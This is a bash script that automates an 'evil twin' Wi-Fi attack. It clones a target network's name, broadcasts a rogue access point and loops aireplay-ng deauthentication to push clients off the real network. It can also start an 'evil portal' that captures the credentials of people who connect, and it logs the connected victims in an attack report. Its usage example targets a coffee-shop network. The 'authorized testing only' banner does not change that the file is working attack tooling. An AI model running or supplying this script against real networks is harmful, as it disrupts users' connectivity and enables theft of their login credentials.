#!/bin/bash

################################################################################
# Evil Twin Attack Automation for Flipper Zero BlackHat OS
################################################################################
# Purpose: Automated rogue AP deployment with optional credential capture
# Author: Generated for authorized penetration testing only
# Requires: BlackHat OS with bh commands, hostapd, dnsmasq
################################################################################

set -euo pipefail

# Configuration
TARGET_BSSID="${1:-}"
TARGET_CHANNEL="${2:-}"
TARGET_ESSID="${3:-}"
ATTACK_INTERFACE="${4:-wlan0}"
INTERNET_INTERFACE="${5:-wlan1}"
ENABLE_PORTAL="${6:-false}"
OUTPUT_DIR="${7:-/root/evil-twin}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="${OUTPUT_DIR}/evil-twin_${TIMESTAMP}.log"
CAPTURED_CREDS="${OUTPUT_DIR}/credentials_${TIMESTAMP}.txt"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# PID tracking
DEAUTH_PID=""
HOSTAPD_PID=""

################################################################################
# Logging
################################################################################
log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${timestamp}] [${level}] ${message}" | tee -a "${LOG_FILE}"
}

################################################################################
# Banner
################################################################################
print_banner() {
    echo -e "${RED}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║              Evil Twin Attack Automation v1.0                 ║
║            Rogue AP with Credential Capture                   ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}⚠ WARNING: This tool is for authorized security testing only!${NC}\n"
}

################################################################################
# Usage
################################################################################
usage() {
    echo "Usage: $0 <BSSID> <CHANNEL> <ESSID> [ATTACK_IFACE] [INET_IFACE] [ENABLE_PORTAL] [OUTPUT_DIR]"
    echo ""
    echo "Arguments:"
    echo "  BSSID           Target AP MAC address to clone"
    echo "  CHANNEL         WiFi channel (1-14)"
    echo "  ESSID           Target network name (SSID)"
    echo "  ATTACK_IFACE    Interface for rogue AP (default: wlan0)"
    echo "  INET_IFACE      Interface with internet (default: wlan1)"
    echo "  ENABLE_PORTAL   Enable evil portal [true/false] (default: false)"
    echo "  OUTPUT_DIR      Output directory (default: /root/evil-twin)"
    echo ""
    echo "Examples:"
    echo "  # Basic Evil Twin (no portal)"
    echo "  $0 AA:BB:CC:DD:EE:FF 6 'CoffeeShop_WiFi'"
    echo ""
    echo "  # Evil Twin with credential capture portal"
    echo "  $0 AA:BB:CC:DD:EE:FF 6 'CoffeeShop_WiFi' wlan0 wlan1 true"
    exit 1
}

################################################################################
# Validate Arguments
################################################################################
validate_args() {
    if [[ -z "$TARGET_BSSID" ]] || [[ -z "$TARGET_CHANNEL" ]] || [[ -z "$TARGET_ESSID" ]]; then
        echo -e "${RED}Error: Missing required arguments${NC}\n"
        usage
    fi

    # Validate BSSID format
    if ! echo "$TARGET_BSSID" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'; then
        echo -e "${RED}Error: Invalid BSSID format${NC}"
        exit 1
    fi

    # Validate channel
    if ! [[ "$TARGET_CHANNEL" =~ ^[0-9]+$ ]] || [[ "$TARGET_CHANNEL" -lt 1 ]] || [[ "$TARGET_CHANNEL" -gt 14 ]]; then
        echo -e "${RED}Error: Channel must be between 1 and 14${NC}"
        exit 1
    fi

    # Check if interfaces are different
    if [[ "$ATTACK_INTERFACE" == "$INTERNET_INTERFACE" ]]; then
        echo -e "${YELLOW}Warning: Same interface for attack and internet. Internet passthrough disabled.${NC}"
    fi

    log "INFO" "Argument validation passed"
}

################################################################################
# Pre-flight Checks
################################################################################
preflight_check() {
    log "INFO" "Starting pre-flight checks..."

    # Create output directory
    mkdir -p "${OUTPUT_DIR}"

    # Check attack interface
    if ! ip link show "${ATTACK_INTERFACE}" &>/dev/null; then
        log "ERROR" "Attack interface ${ATTACK_INTERFACE} not found"
        echo -e "${RED}Error: Interface ${ATTACK_INTERFACE} does not exist${NC}"
        exit 1
    fi

    # Check internet interface
    if ! ip link show "${INTERNET_INTERFACE}" &>/dev/null; then
        log "WARN" "Internet interface ${INTERNET_INTERFACE} not found"
        echo -e "${YELLOW}Warning: No internet interface, continuing without passthrough${NC}"
    fi

    # Check for required commands
    for cmd in bh airmon-ng aireplay-ng; do
        if ! command -v "$cmd" &>/dev/null; then
            log "ERROR" "Required command not found: $cmd"
            echo -e "${RED}Error: $cmd not installed${NC}"
            exit 1
        fi
    done

    log "INFO" "Pre-flight checks completed"
    echo -e "${GREEN}✓ Pre-flight checks passed${NC}\n"
}

################################################################################
# Setup Attack Interface
################################################################################
setup_attack_interface() {
    log "INFO" "Configuring attack interface ${ATTACK_INTERFACE}..."
    echo -e "${CYAN}[*] Setting up attack interface...${NC}"

    # Enable monitor mode if needed
    if ! iwconfig "${ATTACK_INTERFACE}" 2>/dev/null | grep -q "Mode:Monitor"; then
        log "INFO" "Enabling monitor mode on ${ATTACK_INTERFACE}..."
        airmon-ng start "${ATTACK_INTERFACE}" &>/dev/null || true
        sleep 2
    fi

    # Set channel
    log "INFO" "Setting channel to ${TARGET_CHANNEL}..."
    iw dev "${ATTACK_INTERFACE}" set channel "${TARGET_CHANNEL}" 2>/dev/null || true

    echo -e "${GREEN}✓ Attack interface configured${NC}"
}

################################################################################
# Start Rogue Access Point
################################################################################
start_rogue_ap() {
    log "INFO" "Starting rogue access point..."
    echo -e "${CYAN}[*] Starting Evil Twin AP: ${TARGET_ESSID}${NC}"

    # Use bh command to start AP
    bh set AP_SSID "${TARGET_ESSID}"
    log "INFO" "Set AP SSID to: ${TARGET_ESSID}"

    # Start the AP
    bh wifi ap "${ATTACK_INTERFACE}" &>/dev/null &
    sleep 3

    # Verify AP is running
    if iwconfig "${ATTACK_INTERFACE}" 2>/dev/null | grep -q "Mode:Master"; then
        echo -e "${GREEN}✓ Rogue AP is broadcasting${NC}"
        log "SUCCESS" "Rogue AP started successfully"
    else
        echo -e "${RED}✗ Failed to start AP${NC}"
        log "ERROR" "Failed to start rogue AP"
        return 1
    fi
}

################################################################################
# Enable Internet Passthrough
################################################################################
enable_passthrough() {
    if [[ "$ATTACK_INTERFACE" == "$INTERNET_INTERFACE" ]]; then
        log "INFO" "Skipping internet passthrough (same interface)"
        return
    fi

    log "INFO" "Enabling internet passthrough..."
    echo -e "${CYAN}[*] Configuring internet passthrough...${NC}"

    # Use bh command for evil twin passthrough
    if command -v bh &>/dev/null; then
        bh evil_twin &>/dev/null || true
        sleep 2
        echo -e "${GREEN}✓ Internet passthrough enabled${NC}"
        log "SUCCESS" "Internet passthrough configured"
    else
        log "WARN" "bh evil_twin command not available"
    fi
}

################################################################################
# Start Evil Portal
################################################################################
start_evil_portal() {
    if [[ "$ENABLE_PORTAL" != "true" ]]; then
        log "INFO" "Evil portal disabled"
        return
    fi

    log "INFO" "Starting evil portal for credential capture..."
    echo -e "${CYAN}[*] Starting evil portal...${NC}"

    # Use bh command to start evil portal
    bh evil_portal &>/dev/null || {
        log "WARN" "Failed to start evil portal via bh command"
        echo -e "${YELLOW}⚠ Evil portal setup failed${NC}"
        return 1
    }

    sleep 2
    echo -e "${GREEN}✓ Evil portal running${NC}"
    echo -e "${YELLOW}  Portal captures will be saved to captive portal logs${NC}"
    log "SUCCESS" "Evil portal started"
}

################################################################################
# Start Continuous Deauth
################################################################################
start_deauth() {
    log "INFO" "Starting continuous deauthentication attack..."
    echo -e "${CYAN}[*] Deauthenticating clients from legitimate AP...${NC}"

    # Deauth in background with continuous mode
    (
        while true; do
            aireplay-ng -0 5 -a "${TARGET_BSSID}" "${ATTACK_INTERFACE}" >/dev/null 2>&1
            sleep 10
        done
    ) &

    DEAUTH_PID=$!
    log "INFO" "Deauth process started with PID ${DEAUTH_PID}"
    echo -e "${GREEN}✓ Deauth attack running (PID: ${DEAUTH_PID})${NC}"
}

################################################################################
# Monitor Connections
################################################################################
monitor_connections() {
    log "INFO" "Monitoring for client connections..."
    echo -e "\n${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Evil Twin Active - Monitoring Connections${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}\n"

    echo -e "${YELLOW}Target:${NC} ${TARGET_ESSID} (${TARGET_BSSID})"
    echo -e "${YELLOW}Channel:${NC} ${TARGET_CHANNEL}"
    echo -e "${YELLOW}Interface:${NC} ${ATTACK_INTERFACE}"
    echo -e "${YELLOW}Portal:${NC} $(if [[ "$ENABLE_PORTAL" == "true" ]]; then echo "Enabled"; else echo "Disabled"; fi)"
    echo -e "\n${CYAN}Waiting for clients to connect...${NC}"
    echo -e "${CYAN}(Press Ctrl+C to stop)${NC}\n"

    # Monitor loop
    local client_count=0
    while true; do
        # Check connected clients
        local current_clients=$(iw dev "${ATTACK_INTERFACE}" station dump 2>/dev/null | grep "Station" | wc -l)

        if [[ $current_clients -ne $client_count ]]; then
            client_count=$current_clients
            if [[ $client_count -gt 0 ]]; then
                echo -e "${GREEN}[$(date +%H:%M:%S)] ${client_count} client(s) connected${NC}"
                log "INFO" "${client_count} clients connected"

                # Show client details
                iw dev "${ATTACK_INTERFACE}" station dump 2>/dev/null | grep "Station" | while read -r line; do
                    local mac=$(echo "$line" | awk '{print $2}')
                    echo -e "  ${CYAN}└─ ${mac}${NC}"
                done
            fi
        fi

        sleep 5
    done
}

################################################################################
# Generate Report
################################################################################
generate_report() {
    local report_file="${OUTPUT_DIR}/report_${TIMESTAMP}.txt"

    log "INFO" "Generating attack report..."

    cat > "${report_file}" << REPORT
═══════════════════════════════════════════════════════════════
  Evil Twin Attack Report
═══════════════════════════════════════════════════════════════

Attack Timestamp:    $(date)
Target BSSID:        ${TARGET_BSSID}
Target ESSID:        ${TARGET_ESSID}
Channel:             ${TARGET_CHANNEL}
Attack Interface:    ${ATTACK_INTERFACE}
Internet Interface:  ${INTERNET_INTERFACE}
Evil Portal:         $(if [[ "$ENABLE_PORTAL" == "true" ]]; then echo "Enabled"; else echo "Disabled"; fi)

═══════════════════════════════════════════════════════════════
  Connected Clients
═══════════════════════════════════════════════════════════════

$(iw dev "${ATTACK_INTERFACE}" station dump 2>/dev/null | grep "Station" || echo "No clients captured")

═══════════════════════════════════════════════════════════════
  Files Generated
═══════════════════════════════════════════════════════════════

Log:         ${LOG_FILE}
Report:      ${report_file}
$(if [[ "$ENABLE_PORTAL" == "true" ]]; then echo "Credentials: Check /var/log/evil-portal/ for captured data"; fi)

═══════════════════════════════════════════════════════════════
  Notes
═══════════════════════════════════════════════════════════════

- Attack was stopped at $(date)
- Review logs for detailed activity
- Check for captured credentials if portal was enabled
- Ensure original network security has been restored

═══════════════════════════════════════════════════════════════
REPORT

    echo -e "\n${GREEN}✓ Report saved to ${report_file}${NC}"
    log "INFO" "Report saved to ${report_file}"
}

################################################################################
# Cleanup
################################################################################
cleanup() {
    echo -e "\n${YELLOW}[*] Stopping Evil Twin attack...${NC}"
    log "INFO" "Starting cleanup..."

    # Stop deauth
    if [[ -n "$DEAUTH_PID" ]]; then
        log "INFO" "Stopping deauth process (PID: ${DEAUTH_PID})..."
        kill "$DEAUTH_PID" 2>/dev/null || true
        wait "$DEAUTH_PID" 2>/dev/null || true
    fi

    # Stop evil portal
    if [[ "$ENABLE_PORTAL" == "true" ]]; then
        log "INFO" "Stopping evil portal..."
        bh evil_portal stop &>/dev/null || true
    fi

    # Stop AP
    log "INFO" "Stopping rogue AP..."
    bh wifi ap stop &>/dev/null || true

    # Stop any remaining aireplay processes
    pkill -f "aireplay-ng.*${TARGET_BSSID}" 2>/dev/null || true

    # Reset interface
    log "INFO" "Resetting ${ATTACK_INTERFACE}..."
    ip link set "${ATTACK_INTERFACE}" down 2>/dev/null || true
    sleep 1
    ip link set "${ATTACK_INTERFACE}" up 2>/dev/null || true

    generate_report

    echo -e "${GREEN}✓ Cleanup completed${NC}"
    log "INFO" "Cleanup completed successfully"
}

################################################################################
# Main Execution
################################################################################
main() {
    print_banner

    echo -e "${BLUE}Evil Twin Configuration:${NC}"
    echo -e "  Target BSSID:   ${TARGET_BSSID}"
    echo -e "  Target ESSID:   ${TARGET_ESSID}"
    echo -e "  Channel:        ${TARGET_CHANNEL}"
    echo -e "  Attack Iface:   ${ATTACK_INTERFACE}"
    echo -e "  Internet Iface: ${INTERNET_INTERFACE}"
    echo -e "  Evil Portal:    $(if [[ "$ENABLE_PORTAL" == "true" ]]; then echo "Enabled"; else echo "Disabled"; fi)"
    echo -e "  Output Dir:     ${OUTPUT_DIR}\n"

    # Confirm before starting
    echo -e "${YELLOW}⚠ This will launch a rogue access point and deauth attack.${NC}"
    read -p "Continue? (yes/no): " confirm
    if [[ "$confirm" != "yes" ]]; then
        echo -e "${RED}Aborted by user${NC}"
        exit 0
    fi
    echo ""

    validate_args
    preflight_check
    setup_attack_interface
    start_rogue_ap
    enable_passthrough

    if [[ "$ENABLE_PORTAL" == "true" ]]; then
        start_evil_portal
    fi

    start_deauth
    monitor_connections
}

# Handle Ctrl+C gracefully
trap 'echo -e "\n${RED}Interrupted by user${NC}"; cleanup; exit 130' INT TERM

# Check for help flag
if [[ "${1:-}" == "-h" ]] || [[ "${1:-}" == "--help" ]]; then
    usage
fi

# Run main function
main "$@"
